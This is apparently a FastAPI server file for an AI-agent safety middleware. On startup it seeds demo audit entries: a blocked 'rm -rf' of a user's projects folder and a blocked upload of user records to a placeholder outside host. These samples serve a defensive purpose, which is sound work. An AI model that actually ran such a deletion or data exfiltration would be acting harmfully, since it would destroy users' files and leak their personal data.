from contextlib import asynccontextmanager

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

from agent_guardian import __version__
from agent_guardian.api.models import HealthResponse
from agent_guardian.api.routes import actions, approvals
from agent_guardian.api.routes import rollback_route as rollback
from agent_guardian.core.audit import get_audit_log, log_action


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Seed demo audit entries so the dashboard has data on first run."""
    if not get_audit_log():
        await log_action(
            "a1destroy",
            "run_shell_command(args=('rm -rf /home/user/projects',), kwargs={})",
            {
                "score": 98,
                "category": "file_deletion",
                "confidence": 0.99,
                "explanation": "Rule engine: catastrophic file deletion",
            },
            status="blocked",
        )
        await log_action(
            "a2leaker",
            "post_user_data(url='https://suspicious-api.example.com/collect', records=847)",
            {
                "score": 82,
                "category": "pii",
                "confidence": 0.95,
                "explanation": "PII exfiltration to unknown endpoint",
            },
            status="blocked",
        )
        await log_action(
            "a3undo",
            "send_bulk_email(to_list=50 contacts, subject='WRONG: Internal pricing doc')",
            {
                "score": 72,
                "category": "email",
                "confidence": 0.9,
                "explanation": "Bulk email to 50 contacts",
            },
            status="executed",
            extra={"snapshot_id": "demo_snap_001"},
        )
    yield


app = FastAPI(
    title="Agent Guardian API",
    description="Real-time AI safety middleware for autonomous agents",
    version=__version__,
    lifespan=lifespan,
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(actions.router, prefix="/actions", tags=["actions"])
app.include_router(approvals.router, prefix="/approvals", tags=["approvals"])
app.include_router(rollback.router, prefix="/rollback", tags=["rollback"])


@app.get("/health", response_model=HealthResponse)
async def health() -> HealthResponse:
    return HealthResponse(
        status="ok",
        version=__version__,
        pillars=["intercept", "detect", "simulate", "approve", "rollback"],
    )
